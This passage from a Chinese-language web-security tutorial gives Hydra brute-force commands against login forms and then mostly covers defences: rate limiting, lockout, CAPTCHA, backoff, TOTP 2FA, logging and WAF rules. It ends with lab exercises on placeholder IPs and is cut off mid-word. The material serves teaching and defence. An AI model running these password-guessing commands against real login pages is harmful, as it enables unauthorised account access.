# 永远先用小字典测试目标是否有防护
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:failed" -t 1 -f
# -f 表示找到一个有效密码就停止
```

### 技巧 7：使用恢复和继续功能 💾

```bash
# Hydra 支持断点恢复（使用 -e nsr 选项）
# -e nsr 表示：n=空密码，s=同用户名密码，r=反向（密码当用户名）
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:failed" \
  -e nsr -o results.txt

# 如果中断了，可以重新运行相同的命令，Hydra 会自动跳过已尝试的组合
# （因为结果文件中已记录有效密码）

# 也可以指定只尝试特定范围的密码
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:failed" \
  -f  # 找到第一个有效密码立即停止
```

### 技巧 8：调试 Hydra 输出 🐛

```bash
# 开启详细模式查看每次尝试的详细信息
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:failed" -v

# 开启超详细模式（包含 HTTP 请求/响应细节）
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:failed" -V

# 常见调试场景：
# 1. 如果 Hydra 报告所有密码都「成功」，检查失败标识是否正确
# 2. 如果 Hydra 报告没有密码成功，检查：
#    - 目标 URL 是否正确
#    - 失败标识是否出现在失败响应中
#    - 是否有 CSRF Token 或验证码
#    - 是否需要特定请求头
# 3. 使用 -V 查看实际的 HTTP 请求和响应
```

---

## 🛡️ 防御措施

暴力破解是 Web 认证最常见的威胁之一。以下从多个维度构建纵深防御体系。

### 防御 1：速率限制（Rate Limiting）⚡

速率限制是防御暴力破解最直接有效的手段。以下是一个 Python Flask 实现：

```python
# pip install flask flask-limiter
from flask import Flask, request, jsonify
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

app = Flask(__name__)

# 配置速率限制器
limiter = Limiter(
    app=app,
    key_func=get_remote_address,  # 基于客户端IP
    default_limits=["200 per day", "50 per hour"],
    storage_uri="memory://"  # 生产环境应使用 Redis
)

@app.route("/login", methods=["POST"])
@limiter.limit("5 per minute")  # 每分钟最多5次登录尝试
@limiter.limit("20 per hour")   # 每小时最多20次尝试
def login():
    username = request.form.get("username")
    password = request.form.get("password")
    
    # 验证逻辑
    if authenticate(username, password):
        return jsonify({"status": "success"}), 200
    else:
        return jsonify({"status": "error", "message": "Invalid credentials"}), 401

# 当超过速率限制时返回自定义响应
@app.errorhandler(429)
def ratelimit_handler(e):
    return jsonify({
        "error": "Too many login attempts",
        "message": f"Please try again after {e.description}"
    }), 429

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

Nginx 配置速率限制：

```nginx
# /etc/nginx/conf.d/ratelimit.conf

# 定义限流区域：按客户端IP，每秒10个请求
limit_req_zone $binary_remote_addr zone=login:10m rate=5r/s;

server {
    listen 80;
    server_name example.com;

    location /login {
        # 限制请求速率，burst允许突发10个排队请求
        limit_req zone=login burst=10 nodelay;
        limit_req_status 429;  # 超限返回429状态码

        proxy_pass http://backend;
    }
}
```

### 防御 2：账户锁定策略 🔒

```python
# 基于内存的账户锁定实现（生产环境使用 Redis/数据库）
from datetime import datetime, timedelta
import threading

# 线程安全的锁定存储
lock_storage = {}
lock_mutex = threading.Lock()

MAX_ATTEMPTS = 5
LOCKOUT_DURATION = timedelta(minutes=30)

def check_account_lock(username):
    """检查账户是否被锁定"""
    with lock_mutex:
        if username in lock_storage:
            lock_info = lock_storage[username]
            if datetime.now() < lock_info["unlock_time"]:
                return True, lock_info["unlock_time"]
            else:
                # 锁定期已过，清除记录
                del lock_storage[username]
        return False, None

def record_failed_attempt(username):
    """记录失败尝试，达到阈值则锁定账户"""
    with lock_mutex:
        if username not in lock_storage:
            lock_storage[username] = {
                "attempts": 0,
                "unlock_time": None
            }
        lock_storage[username]["attempts"] += 1
        
        if lock_storage[username]["attempts"] >= MAX_ATTEMPTS:
            lock_storage[username]["unlock_time"] = datetime.now() + LOCKOUT_DURATION
            print(f"[ALERT] Account {username} locked until {lock_storage[username]['unlock_time']}")

def reset_attempts(username):
    """登录成功后重置计数器"""
    with lock_mutex:
        if username in lock_storage:
            del lock_storage[username]

def login_handler(username, password):
    # 检查账户锁定状态
    is_locked, unlock_time = check_account_lock(username)
    if is_locked:
        return {
            "success": False,
            "message": f"Account locked. Try again after {unlock_time}"
        }
    
    # 验证凭据
    if authenticate(username, password):
        reset_attempts(username)
        return {"success": True}
    else:
        record_failed_attempt(username)
        return {"success": False, "message": "Invalid credentials"}
```

### 防御 3：CAPTCHA 验证码 🤖

```python
# 使用 Flask 集成 reCAPTCHA
# pip install flask-recaptcha

from flask import Flask, request, jsonify
from flask_recaptcha import ReCaptcha

app = Flask(__name__)
app.config.update({
    # Google reCAPTCHA v2
    "RECAPTCHA_SITE_KEY": "your_site_key",
    "RECAPTCHA_SECRET_KEY": "your_secret_key",
    
    # 在第3次失败后显示 CAPTCHA
    "RECAPTCHA_ENABLED": False  # 动态控制
})

recaptcha = ReCaptcha(app)

# 追踪每个IP的失败次数
failed_attempts = {}

def should_show_captcha(client_ip):
    """根据失败次数决定是否显示 CAPTCHA"""
    return failed_attempts.get(client_ip, 0) >= 3

@app.route("/login", methods=["POST"])
def login():
    client_ip = request.remote_addr
    
    # 如果该 IP 失败次数超过阈值，要求验证 CAPTCHA
    if should_show_captcha(client_ip):
        if not recaptcha.verify():
            return jsonify({"error": "CAPTCHA verification failed"}), 400
    
    username = request.form.get("username")
    password = request.form.get("password")
    
    if authenticate(username, password):
        failed_attempts.pop(client_ip, None)  # 成功则清除计数
        return jsonify({"success": True})
    else:
        failed_attempts[client_ip] = failed_attempts.get(client_ip, 0) + 1
        remaining = max(0, 3 - failed_attempts[client_ip])
        return jsonify({
            "success": False,
            "remaining_attempts": remaining,
            "require_captcha": remaining <= 0
        }), 401
```

### 防御 4：渐进式延迟（Exponential Backoff）⏱️

```python
import time
from datetime import datetime, timedelta

attempt_tracker = {}

def get_login_delay(username, client_ip):
    """根据失败次数计算延迟时间（指数增长）"""
    key = f"{client_ip}:{username}"
    attempts = attempt_tracker.get(key, {}).get("count", 0)
    
    if attempts <= 2:
        return 0  # 前2次无延迟
    elif attempts <= 5:
        return 1  # 第3-5次延迟1秒
    elif attempts <= 10:
        return attempts  # 第6-10次延迟等于次数
    else:
        return min(60, 2 ** (attempts - 10))  # 10次后指数增长，最大60秒

def handle_login(username, password, client_ip):
    key = f"{client_ip}:{username}"
    
    # 检查是否需要延迟
    delay = get_login_delay(username, client_ip)
    if delay > 0:
        time.sleep(delay)  # 在服务端增加延迟
        # 注意：这会消耗服务器资源，更好的方式是返回给客户端重试时间
    
    if authenticate(username, password):
        attempt_tracker.pop(key, None)
        return {"success": True}
    else:
        if key not in attempt_tracker:
            attempt_tracker[key] = {"count": 0, "last_attempt": datetime.now()}
        attempt_tracker[key]["count"] += 1
        next_delay = get_login_delay(username, client_ip)
        return {
            "success": False,
            "retry_after": next_delay if next_delay > 0 else None
        }
```

### 防御 5：双因素认证（2FA/MFA）🔑

```python
# 使用 pyotp 实现基于 TOTP 的双因素认证
# pip install pyotp qrcode

import pyotp
import qrcode
from io import BytesIO
import base64

def generate_totp_secret(username):
    """为用户生成 TOTP 密钥"""
    secret = pyotp.random_base32()
    totp = pyotp.TOTP(secret)
    
    # 生成二维码供用户扫描（Google Authenticator 等）
    uri = totp.provisioning_uri(name=username, issuer_name="MyApp")
    qr = qrcode.make(uri)
    buf = BytesIO()
    qr.save(buf, format="PNG")
    qr_base64 = base64.b64encode(buf.getvalue()).decode()
    
    return secret, qr_base64

def verify_totp(secret, user_code):
    """验证用户输入的 TOTP 码"""
    totp = pyotp.TOTP(secret)
    return totp.verify(user_code, valid_window=1)  # 允许前后30秒偏差

def login_with_2fa(username, password, totp_code):
    # 第一阶段：验证密码
    if not authenticate(username, password):
        return {"success": False, "stage": "password", "error": "Invalid credentials"}
    
    # 第二阶段：验证 2FA
    user_secret = get_user_totp_secret(username)  # 从数据库获取
    if not verify_totp(user_secret, totp_code):
        return {"success": False, "stage": "2fa", "error": "Invalid 2FA code"}
    
    return {"success": True}
```

### 防御 6：登录日志与告警 📊

```python
# 登录事件监控与告警系统
from datetime import datetime
import logging

# 配置安全日志
security_logger = logging.getLogger("security")
security_logger.setLevel(logging.INFO)
handler = logging.FileHandler("/var/log/security/login_attempts.log")
handler.setFormatter(logging.Formatter(
    "%(asctime)s | %(levelname)s | %(message)s"
))
security_logger.addHandler(handler)

def log_login_attempt(username, ip, success, user_agent=""):
    """记录登录尝试"""
    event = {
        "timestamp": datetime.now().isoformat(),
        "username": username,
        "ip": ip,
        "success": success,
        "user_agent": user_agent
    }
    
    if success:
        security_logger.info(f"LOGIN_SUCCESS | user={username} ip={ip}")
    else:
        security_logger.warning(f"LOGIN_FAILED | user={username} ip={ip} ua={user_agent}")

def check_brute_force_indicators(username, ip, time_window_minutes=5):
    """检测暴力破解指标"""
    # 统计时间窗口内的失败次数
    recent_failures = count_recent_failures(ip, time_window_minutes)
    
    indicators = {
        "is_brute_force": False,
        "failure_count": recent_failures,
        "alert_level": "none"
    }
    
    if recent_failures > 20:
        indicators["is_brute_force"] = True
        indicators["alert_level"] = "critical"
        security_logger.critical(
            f"BRUTE_FORCE_DETECTED | ip={ip} user={username} "
            f"failures={recent_failures} in {time_window_minutes}min"
        )
        # 触发告警：发送邮件/Slack通知/临时封禁IP
    elif recent_failures > 10:
        indicators["alert_level"] = "warning"
        security_logger.warning(
            f"SUSPICIOUS_ACTIVITY | ip={ip} user={username} "
            f"failures={recent_failures}"
        )
    
    return indicators
```

### 防御 7：Web 应用防火墙（WAF）规则 🧱

使用 ModSecurity WAF 规则检测暴力破解：

```
# /etc/modsecurity/crs/rules/REQUEST-942-BRUTEFORCE.conf

# 检测短时间内大量 POST 到登录页面
SecRule REQUEST_URI "@contains /login" \
    "chain"
    SecRule REQUEST_METHOD "@streq POST" \
    "chain"
    SecRule IP:BRUTEFORCE_COUNT "@gt 10" \
    "id:942100,phase:2,deny,status:429,\
     msg:'Possible Brute Force Attack Detected',\
     logdata:'Brute force attempt from %{REMOTE_ADDR}',\
     setvar:ip.bruteforce_counter=+1"

# 检测异常的 User-Agent（Hydra 默认 UA）
SecRule REQUEST_HEADERS:User-Agent "@contains Hydra" \
    "id:942101,phase:1,deny,status:403,\
     msg:'Hydra User-Agent Detected'"

# 检测缺少 Referer 头的登录请求
SecRule REQUEST_URI "@contains /login" \
    "chain"
SecRule REQUEST_METHOD "@streq POST" \
    "chain"
SecRule &REQUEST_HEADERS:Referer "@eq 0" \
    "id:942102,phase:2,deny,status:403,\
     msg:'Login attempt without Referer header'"
```

### 防御措施总结

| 防御手段 | 防护强度 | 实现难度 | 用户体验影响 | 推荐优先级 |
|---------|---------|---------|------------|---------|
| 速率限制 | ⭐⭐⭐ | ⭐⭐ | 低 | 🔴 必须 |
| 账户锁定 | ⭐⭐⭐⭐ | ⭐⭐ | 中（可能被恶意锁定） | 🔴 必须 |
| CAPTCHA | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | 高 | 🟡 强烈推荐 |
| 渐进延迟 | ⭐⭐⭐ | ⭐ | 中 | 🟢 推荐 |
| 双因素认证 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | 高 | 🟡 强烈推荐 |
| 登录日志告警 | ⭐⭐ | ⭐ | 无 | 🔴 必须 |
| WAF 规则 | ⭐⭐⭐ | ⭐⭐⭐ | 低 | 🟢 推荐 |

---

## 📝 课后练习

### 练习 1：基础 — 爆破 HTTP Basic Auth ⭐

**目标**：使用 Hydra 爆破一个 HTTP Basic Auth 保护的页面。

```bash
# 靶机地址：http://192.168.1.100:8080/
# 提示：用户名为 admin，密码在提供的字典中

hydra -l ??? -P ??? ??? -s ??? http-get /
```

**任务要求**：
1. 用 curl 探测认证类型
2. 使用 Hydra 找到 admin 的密码
3. 用找到的凭据通过 curl 访问受保护页面
4. 记录找到的 flag

### 练习 2：进阶 — 表单登录爆破 ⭐⭐

**目标**：对一个使用 POST 表单登录的网站进行认证测试。

```bash
# 登录页面：http://192.168.1.100:8081/login
# 提示：分析登录表单结构后使用 http-post-form 模块
```

**任务要求**：
1. 使用浏览器开发者工具或 curl 分析表单字段
2. 确定登录 URL、字段名、失败标识
3. 编写正确的 Hydra 命令
4. 找到至少 2 个有效账户

### 练习 3：高级 — 处理 CSRF Token ⭐⭐⭐

**目标**：对一个带有严格 CSRF Token 校验的登录页面进行爆破。

**提示**：
- 编写一个 bash 脚本，先 GET 登录页面获取 CSRF Token
- 再用该 Token 发送 POST 请求
- 循环此过程直到找到正确密码

```bash
# 参考脚本框架
#!/bin/bash
# brute_with_csrf.sh
TARGET="http://192.168.1.100:8081"
USERNAMES=(admin operator guest)
PASSWORDS=$(cat passwords.txt)

for user in "${USERNAMES[@]}"; do
  for pass in $PASSWORDS; do
    # 1. GET /login 获取 CSRF token
    # 2. POST /login 带上 token
    # 3. 检查响应判断是否成功
    # 4. 成功则输出并退出
  done
done
```

### 练习 4：综合 — HTTPS 站点认证测试 ⭐⭐⭐

**目标**：对一个使用 HTTPS、带有 Referer 检查和 CAPTCHA 触发机制的网站进行测试。

**场景**：
- 网站：`https://192.168.1.100:443/login`
- 使用自签名证书
- 检查 Referer 头
- 前 5 次失败后显示 CAPTCHA

**任务要求**：
1. 编写绕过 Referer 检查的 Hydra 命令
2. 分析 CAPTCHA 出现的条件
3. 在 CAPTCHA 出现前找到正确密码
4. 讨论如果密码不在前 5 个尝试中，应该如何应对

### 练习 5：攻防 — 实现登录防护 ⭐⭐⭐⭐

**目标**：为实验靶机添加以下防护机制，并测试其效果。

**要求**：
1. 实现基于 IP 的速率限制（每分钟最多 5 次登录尝试）
2. 实现}